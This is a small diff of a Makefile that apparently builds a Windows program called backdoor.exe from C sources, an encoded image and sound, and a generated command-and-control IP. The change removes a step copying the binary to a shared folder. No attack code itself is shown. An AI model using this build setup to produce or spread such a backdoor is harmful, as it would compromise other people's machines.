@@ -7,7 +7,6 @@ all: 	xor_string encode_bin make_cnc_ip pwnage_img.c pwned_sound.c backdoor.exe
 backdoor.exe:
 	$(MINGCC) backdoor.c pwnage_img.c pwned_sound.c -lwinmm -lws2_32 -o backdoor.exe
 	$(MINGSTRIP) backdoor.exe
-	cp backdoor.exe /share
 
 pwned_sound.c:
 	./encode_bin pwned.mp3 pwned_sound.c pwned_sound
